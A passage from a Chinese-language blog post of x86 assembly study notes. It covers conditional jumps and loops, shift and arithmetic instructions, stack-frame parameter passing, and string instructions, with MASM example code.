id="基于特定标志位"><a href="#基于特定标志位" class="headerlink" title="基于特定标志位"></a>基于特定标志位</h4><table><thead><tr><th style="text-align:center">为真时跳转</th><th style="text-align:center">为假时跳转</th><th style="text-align:center">相关标志位</th></tr></thead><tbody><tr><td style="text-align:center">JZ</td><td style="text-align:center">JNZ</td><td style="text-align:center">ZF</td></tr><tr><td style="text-align:center">JC</td><td style="text-align:center">JNC</td><td style="text-align:center">CF</td></tr><tr><td style="text-align:center">JO</td><td style="text-align:center">JNO</td><td style="text-align:center">OF</td></tr><tr><td style="text-align:center">JS</td><td style="text-align:center">JNS</td><td style="text-align:center">SF</td></tr><tr><td style="text-align:center">JP</td><td style="text-align:center">JNP</td><td style="text-align:center">PF</td></tr></tbody></table><h4 id="基于相等比较"><a href="#基于相等比较" class="headerlink" title="基于相等比较"></a>基于相等比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">JE</td><td style="text-align:center">相等跳转 同JZ</td></tr><tr><td style="text-align:center">JNE</td><td style="text-align:center">不相等跳转 同JNZ</td></tr><tr><td style="text-align:center">JCXZ</td><td style="text-align:center">CX=0跳转</td></tr><tr><td style="text-align:center">JECXZ</td><td style="text-align:center">ECX=0跳转</td></tr></tbody></table><h4 id="基于无符号数比较"><a href="#基于无符号数比较" class="headerlink" title="基于无符号数比较"></a>基于无符号数比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><strong>JA</strong></td><td style="text-align:center">大于跳转</td></tr><tr><td style="text-align:center"><strong>JB</strong></td><td style="text-align:center">小于跳转</td></tr><tr><td style="text-align:center">JAE</td><td style="text-align:center">大于等于</td></tr><tr><td style="text-align:center">JBE</td><td style="text-align:center">小于等于</td></tr><tr><td style="text-align:center">JNA</td><td style="text-align:center">不大于</td></tr><tr><td style="text-align:center">JNB</td><td style="text-align:center">不小于</td></tr><tr><td style="text-align:center">JNBE</td><td style="text-align:center">同JA</td></tr><tr><td style="text-align:center">JNAE</td><td style="text-align:center">同JB</td></tr></tbody></table><h4 id="基于有符号数比较"><a href="#基于有符号数比较" class="headerlink" title="基于有符号数比较"></a>基于有符号数比较</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><strong>JG</strong></td><td style="text-align:center">大于跳转</td></tr><tr><td style="text-align:center"><strong>JL</strong></td><td style="text-align:center">小于跳转</td></tr><tr><td style="text-align:center">JGE</td><td style="text-align:center">大于等于</td></tr><tr><td style="text-align:center">JLE</td><td style="text-align:center">小于等于</td></tr><tr><td style="text-align:center">JNG</td><td style="text-align:center">不大于</td></tr><tr><td style="text-align:center">JNL</td><td style="text-align:center">不小于</td></tr><tr><td style="text-align:center">JNLE</td><td style="text-align:center">同JG</td></tr><tr><td style="text-align:center">JNGE</td><td style="text-align:center">同JL</td></tr></tbody></table><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p>将最小有符号数存到AX：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">Mov</span> <span class="built_in">ax</span>,v1</span><br><span class="line">     <span class="keyword">Cmp</span> <span class="built_in">ax</span>,v2</span><br><span class="line">     <span class="keyword">JL</span>   L1</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ax</span>,v2</span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">cmp</span> <span class="built_in">ax</span>,v3</span><br><span class="line">     <span class="keyword">JL</span>    L2</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ax</span>, v3</span><br><span class="line"><span class="symbol">L2:</span></span><br></pre></td></tr></table></figure></p><p><strong>数组的顺序查找</strong>：<br>查找第一个非0值<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE Irvine32.inc</span><br><span class="line"></span><br><span class="line"><span class="meta">.data</span></span><br><span class="line">intArray SWORD <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">35</span>,-<span class="number">12</span>,<span class="number">66</span>,<span class="number">4</span>,<span class="number">0</span></span><br><span class="line">noneMsg <span class="built_in">BYTE</span> <span class="string">"A non-zero value was not found"</span>, <span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">main PROC</span><br><span class="line"><span class="keyword">mov</span><span class="built_in">ebx</span>, OFFSET intArray</span><br><span class="line"><span class="keyword">mov</span><span class="built_in">ecx</span>, LENGTHOF intArray</span><br><span class="line"><span class="symbol">L1:</span> <span class="keyword">cmp</span><span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebx</span>], <span class="number">0</span></span><br><span class="line"><span class="keyword">jne</span>found</span><br><span class="line"><span class="keyword">add</span><span class="built_in">ebx</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">loop</span>L1</span><br><span class="line"><span class="keyword">jmp</span>notFound</span><br><span class="line"><span class="symbol">found:</span></span><br><span class="line"><span class="keyword">movsx</span><span class="built_in">eax</span>, <span class="built_in">WORD</span> <span class="built_in">PTR</span>[<span class="built_in">ebx</span>]</span><br><span class="line"><span class="keyword">call</span>WriteInt</span><br><span class="line"><span class="keyword">jmp</span>quit</span><br><span class="line"><span class="symbol">notFound:</span></span><br><span class="line"><span class="keyword">mov</span><span class="built_in">edx</span>, OFFSET noneMsg</span><br><span class="line"><span class="keyword">call</span>WriteString</span><br><span class="line"><span class="symbol">quit:</span></span><br><span class="line"><span class="keyword">call</span>Crlf</span><br><span class="line">exit</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure></p><h3 id="条件循环指令"><a href="#条件循环指令" class="headerlink" title="条件循环指令"></a>条件循环指令</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">循环条件</th></tr></thead><tbody><tr><td style="text-align:center">LOOPZ</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=1</td></tr><tr><td style="text-align:center">LOOPE</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=1</td></tr><tr><td style="text-align:center">LOOPNZ</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=0</td></tr><tr><td style="text-align:center">LOOPNE</td><td style="text-align:center">ECX&gt;0 &amp;&amp; ZF=0</td></tr></tbody></table><p><strong>LOOPE和LOOPZ不影响任何状态标志</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Array        SWORD    -<span class="number">3</span>,-<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">5</span></span><br><span class="line">Sentinel   SWORD    <span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="comment">; …</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span> , offset array</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof array</span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">test</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">8000h</span></span><br><span class="line">     <span class="keyword">pushfd</span>            <span class="comment">; pushfd不修改标志位</span></span><br><span class="line">     <span class="keyword">add</span> <span class="built_in">esi</span> , type array</span><br><span class="line">     <span class="keyword">popfd</span></span><br><span class="line">     <span class="keyword">loopnz</span>   L1       <span class="comment">; 注意：loopnz不修改标志位</span></span><br><span class="line">     <span class="keyword">jnz</span> quit</span><br><span class="line">     <span class="keyword">sub</span>  <span class="built_in">esi</span> , type array</span><br><span class="line"><span class="symbol">Quit:</span></span><br></pre></td></tr></table></figure></p><h2 id="0x05-整数算术指令"><a href="#0x05-整数算术指令" class="headerlink" title="0x05 整数算术指令"></a>0x05 整数算术指令</h2><h3 id="移位和循环移位"><a href="#移位和循环移位" class="headerlink" title="移位和循环移位"></a>移位和循环移位</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">SHL</td><td style="text-align:center">逻辑左移</td></tr><tr><td style="text-align:center">SHR</td><td style="text-align:center">逻辑右移</td></tr><tr><td style="text-align:center">SAL</td><td style="text-align:center">算术左移</td></tr><tr><td style="text-align:center">SAR</td><td style="text-align:center">算术右移</td></tr><tr><td style="text-align:center">ROL</td><td style="text-align:center">循环左移</td></tr><tr><td style="text-align:center">ROR</td><td style="text-align:center">循环右移</td></tr><tr><td style="text-align:center">RCL</td><td style="text-align:center">带进位的循环左移</td></tr><tr><td style="text-align:center">RCR</td><td style="text-align:center">带进位的循环右移</td></tr><tr><td style="text-align:center">SHLD</td><td style="text-align:center">双精度左移</td></tr><tr><td style="text-align:center">SHRD</td><td style="text-align:center">双精度右移</td></tr></tbody></table><h4 id="逻辑移位和算术移位"><a href="#逻辑移位和算术移位" class="headerlink" title="逻辑移位和算术移位"></a>逻辑移位和算术移位</h4><p><strong>SHL/SAL</strong><br><code>SHL 目的操作数， 移位位数</code><br>功能：对目的操作数执行左移操作，最低位补0，移出的最高位送入进位标志CF，原来的进位位将丢失。SHL和SAL功能完全一样。<br><img src="/2018/11/30/汇编基础/1543734153075.png" alt="Alt text"></p><p>左移的SHL和SAL是等价的。算术移位不改变符号位，逻辑移位可能改变符号位<br><strong>SHR</strong><br><code>SHR 目的操作数， 移位位数</code><br>功能：将目的操作数逻辑右移，左边空出的位添0，右边最低位被移出，复制到CF位中<br>SHR可以实现无符号数的快速除法<br><img src="/2018/11/30/汇编基础/1543734370787.png" alt="Alt text"><br><strong>SAR</strong><br>有符号数的快速除法，右移过程中最高位保持不变<br><img src="/2018/11/30/汇编基础/1543734566197.png" alt="Alt text"><br><strong>ROL/ROR/RCL/RCR</strong><br>移出的位又送回另一端<br><img src="/2018/11/30/汇编基础/1543734631536.png" alt="Alt text"><br><strong>SHLD/SHRD</strong><br><img src="/2018/11/30/汇编基础/1543735003727.png" alt="Alt text"><br><strong>应用</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BinToAsc PROC  uses <span class="built_in">eax</span> <span class="built_in">ebx</span> <span class="built_in">ecx</span>  <span class="built_in">esi</span></span><br><span class="line"> <span class="comment">;将EAX中的数转换成二进制ASCII码存到ESI指向的数组中</span></span><br><span class="line">  <span class="keyword">Add</span> <span class="built_in">esi</span> , <span class="number">31</span></span><br><span class="line">  <span class="keyword">Mov</span> <span class="built_in">ecx</span> ,<span class="number">32</span></span><br><span class="line"><span class="symbol">Nxt:</span></span><br><span class="line">    <span class="keyword">Mov</span> <span class="built_in">bl</span>,  <span class="built_in">al</span></span><br><span class="line">    <span class="keyword">And</span> <span class="built_in">bl</span> , <span class="number">1</span></span><br><span class="line">    <span class="keyword">Add</span> <span class="built_in">bl</span> , <span class="number">30H</span></span><br><span class="line">    <span class="keyword">Mov</span> [<span class="built_in">esi</span>],<span class="built_in">bl</span></span><br><span class="line">    <span class="keyword">Shr</span>  <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">Dec</span> <span class="built_in">esi</span></span><br><span class="line">  <span class="keyword">Loop</span> nxt</span><br><span class="line">  <span class="keyword">Ret</span></span><br><span class="line">BinToAsc ENDP</span><br></pre></td></tr></table></figure></p><h4 id="乘法和除法指令"><a href="#乘法和除法指令" class="headerlink" title="乘法和除法指令"></a>乘法和除法指令</h4><table><thead><tr><th style="text-align:center">助记符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">MUL</td><td style="text-align:center">无符号乘法</td></tr><tr><td style="text-align:center">IMUL</td><td style="text-align:center">有符号乘法</td></tr><tr><td style="text-align:center">DIV</td><td style="text-align:center">无符号除法</td></tr><tr><td style="text-align:center">IDIV</td><td style="text-align:center">有符号除法</td></tr></tbody></table><h5 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4h</span></span><br><span class="line"><span class="keyword">Mul</span>  <span class="built_in">bl</span>   <span class="comment">;AX =0C0H,CF=0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">ax</span> , <span class="number">2000h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bx</span> ,<span class="number">100h</span></span><br><span class="line"><span class="keyword">Mul</span>  <span class="built_in">bx</span>   <span class="comment">;DX:AX=0020 0000h,CF=1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, -<span class="number">4</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">IMUL</span>  <span class="built_in">bl</span>             <span class="comment">;AX=0FFF0H,CF=0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">ax</span>, <span class="number">30h</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bx</span>, <span class="number">4h</span></span><br><span class="line"><span class="keyword">IMul</span> <span class="built_in">bx</span>            <span class="comment">;DX:AX =0C0H,CF=0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">al</span>, <span class="number">48</span></span><br><span class="line"><span class="keyword">Mov</span> <span class="built_in">bl</span>, <span class="number">4</span></span><br><span class="line"><span class="keyword">IMUL</span>  <span class="built_in">bl</span>             <span class="comment">;AX=00C0H（即十进制的192）,CF=1</span></span><br></pre></td></tr></table></figure><h5 id="任意进制的码制转换"><a href="#任意进制的码制转换" class="headerlink" title="任意进制的码制转换"></a>任意进制的码制转换</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">ASCIICHAR <span class="built_in">BYTE</span>  <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWZYX'</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">ToASC PROC  uses <span class="built_in">eax</span> <span class="built_in">ebx</span>  <span class="built_in">ecx</span>  <span class="built_in">esi</span>  </span><br><span class="line"><span class="comment">;将EAX中的数按BL中指定的进制数，转换成ASCII字符串放到ESI指向的数组中</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">ecx</span> , <span class="number">0</span>   <span class="comment">;</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">cl</span> , <span class="built_in">bl</span>      <span class="comment">; movzx  ecx, bl</span></span><br><span class="line">   <span class="keyword">add</span> <span class="built_in">esi</span> , <span class="number">31</span></span><br><span class="line"><span class="symbol">nxt_ta:</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">edx</span> , <span class="number">0</span> </span><br><span class="line">   <span class="keyword">div</span>   <span class="built_in">ecx</span></span><br><span class="line">   <span class="keyword">mov</span> <span class="built_in">bl</span>,ASCIICHAR[<span class="built_in">edx</span>]</span><br><span class="line">   <span class="keyword">mov</span> [<span class="built_in">esi</span>],<span class="built_in">bl</span></span><br><span class="line">   <span class="keyword">dec</span> <span class="built_in">esi</span></span><br><span class="line">   <span class="keyword">cmp</span> <span class="built_in">eax</span> , <span class="number">0</span></span><br><span class="line">   <span class="keyword">jnz</span> nxt_ta<span class="comment">; jne</span></span><br><span class="line">   <span class="keyword">ret</span> </span><br><span class="line">ToASC ENDP</span><br></pre></td></tr></table></figure><h2 id="0x06-高级过程"><a href="#0x06-高级过程" class="headerlink" title="0x06 高级过程"></a>0x06 高级过程</h2><h3 id="stack-frame"><a href="#stack-frame" class="headerlink" title="stack frame"></a>stack frame</h3><h4 id="给子过程传递参数的两种基本方式"><a href="#给子过程传递参数的两种基本方式" class="headerlink" title="给子过程传递参数的两种基本方式"></a>给子过程传递参数的两种基本方式</h4><ol><li>通过寄存器传递</li></ol><ul><li>执行效率高</li><li>代码可能显得混乱</li><li>寄存器数量有限<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">esi</span> , offset array</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>,lengthof array</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span> , type array</span><br><span class="line"><span class="keyword">call</span> DumpMem</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>通过堆栈传递</li></ol><ul><li>方式灵活通用</li><li>效率偏低<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> offset array</span><br><span class="line"><span class="keyword">push</span> lengthof array</span><br><span class="line"><span class="keyword">push</span> type array</span><br><span class="line"><span class="keyword">call</span> DumpMem2</span><br></pre></td></tr></table></figure></li></ul><p>使用堆栈传递参数时压入了两类参数：</p><ul><li><strong>值参数（变量或常量的值）</strong></li><li><strong>引用/指针参数（变量的地址）</strong></li></ul><h5 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h5><p>传递值<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">push</span> val2</span><br><span class="line"><span class="keyword">push</span> val1</span><br><span class="line"><span class="keyword">call</span> AddTwo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/30/汇编基础/1543737991386.png" alt="Alt text"><br><code>AddTwo(val1,val2)</code></p><p>传递引用<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">push</span> offset val2</span><br><span class="line"><span class="keyword">push</span> offset val1</span><br><span class="line"><span class="keyword">call</span> AddTwo</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/30/汇编基础/1543738006283.png" alt="Alt text"><br> <code>AddTwo(&amp;val1,&amp;val2)</code></p><h5 id="重点：参数访问"><a href="#重点：参数访问" class="headerlink" title="重点：参数访问"></a>重点：参数访问</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span> val2</span><br><span class="line"><span class="keyword">Push</span> val1</span><br><span class="line"><span class="keyword">Call</span> AddTwo</span><br><span class="line">…</span><br><span class="line">AddTwo proc</span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">Mov</span>  <span class="built_in">ebp</span> , <span class="built_in">esp</span></span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">eax</span> , [<span class="built_in">ebp</span> + <span class="number">12</span>]     <span class="comment">;取得val2</span></span><br><span class="line">  <span class="keyword">add</span>  <span class="built_in">eax</span> ,  [<span class="built_in">ebp</span> + <span class="number">8</span>]       <span class="comment">;加上val1</span></span><br><span class="line">  <span class="keyword">pop</span>   <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">ret</span></span><br><span class="line">AddTwo endp</span><br></pre></td></tr></table></figure><p><img src="/2018/11/30/汇编基础/1543738140799.png" alt="Alt text"></p><h4 id="堆栈清理"><a href="#堆栈清理" class="headerlink" title="堆栈清理"></a>堆栈清理</h4><p>因为在调用子过程前，给堆栈压入了一些内容，在子过程返回时，必须调整堆栈指针。</p><ul><li>在调用完子过程后通过加法指令改变ESP值</li><li>通过 RET imm 指令的形式<br>add方法：<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span>  val2</span><br><span class="line"><span class="keyword">Push</span>  val1</span><br><span class="line"><span class="keyword">Call</span>    AddTwo</span><br><span class="line"><span class="keyword">Add</span>    <span class="built_in">esp</span> , <span class="number">8</span></span><br></pre></td></tr></table></figure></li></ul><p>ret方法，在子过程中调用：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">Val1 <span class="built_in">dword</span> <span class="number">5</span></span><br><span class="line">Val2 <span class="built_in">dword</span> <span class="number">6</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line"><span class="keyword">Push</span> val2</span><br><span class="line"><span class="keyword">Push</span> val1</span><br><span class="line"><span class="keyword">Call</span> AddTwo</span><br><span class="line">AddTwo proc</span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">12</span>]</span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">  <span class="keyword">ret</span>  <span class="number">8</span></span><br><span class="line">AddTwo endp</span><br></pre></td></tr></table></figure></p><p>采用uses操作符保存寄存器，则要注意uses指令是将寄存器的压栈指令放在子过程的开始，即在堆栈帧里push ebp语句之前，这时，参数偏移地址计算将会受到影响</p><h2 id="0x07-字符串和数组"><a href="#0x07-字符串和数组" class="headerlink" title="0x07 字符串和数组"></a>0x07 字符串和数组</h2><p><code>CLD</code> 清除方向标志<br><code>STD</code>设置方向标志</p><h3 id="MOVSB-MOVSW-MOVSD"><a href="#MOVSB-MOVSW-MOVSD" class="headerlink" title="MOVSB,MOVSW,MOVSD"></a>MOVSB,MOVSW,MOVSD</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">功能</th><th style="text-align:center">ESI和EDI修改量</th></tr></thead><tbody><tr><td style="text-align:center">MOVSB</td><td style="text-align:center">复制字节</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">MOVSW</td><td style="text-align:center">复制字</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">MOVSD</td><td style="text-align:center">复制双字</td><td style="text-align:center">4</td></tr></tbody></table><h4 id="复制双字数组"><a href="#复制双字数组" class="headerlink" title="复制双字数组"></a>复制双字数组</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  source <span class="built_in">dword</span> <span class="number">20</span> dup(<span class="number">0ffh</span>)</span><br><span class="line">  target  <span class="built_in">dword</span> <span class="number">20</span> dup(?)</span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="comment">; … </span></span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span> , offset source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset target</span><br><span class="line">  <span class="keyword">rep</span> <span class="keyword">movsd</span>    <span class="comment">;将source开始的20个双字复制到target中</span></span><br><span class="line">  <span class="comment">; …</span></span><br></pre></td></tr></table></figure><h3 id="CMPSB-CMPSW-CMPSD"><a href="#CMPSB-CMPSW-CMPSD" class="headerlink" title="CMPSB,CMPSW,CMPSD"></a>CMPSB,CMPSW,CMPSD</h3><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">操作</th></tr></thead><tbody><tr><td style="text-align:center">CMPSB</td><td style="text-align:center">比较字节</td></tr><tr><td style="text-align:center">CMPSW</td><td style="text-align:center">比较字</td></tr><tr><td style="text-align:center">CMPSD</td><td style="text-align:center">比较双字</td></tr></tbody></table><h4 id="单个比较"><a href="#单个比较" class="headerlink" title="单个比较"></a>单个比较</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  source <span class="built_in">dword</span> <span class="number">1234h</span></span><br><span class="line">  target  <span class="built_in">dword</span>  <span class="number">5678h</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="comment">; …</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span> , offset source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset target</span><br><span class="line">  <span class="keyword">cmpsd</span>   <span class="comment">;比较双字</span></span><br><span class="line">  <span class="keyword">ja</span> L1     <span class="comment">;如果source&gt;targe跳转至L1 </span></span><br><span class="line">  <span class="keyword">jmp</span> L2  <span class="comment">;如果source&lt;=target跳转至L2，本例即是</span></span><br><span class="line">  <span class="comment">; ….</span></span><br></pre></td></tr></table></figure><h4 id="字符串比较"><a href="#字符串比较" class="headerlink" 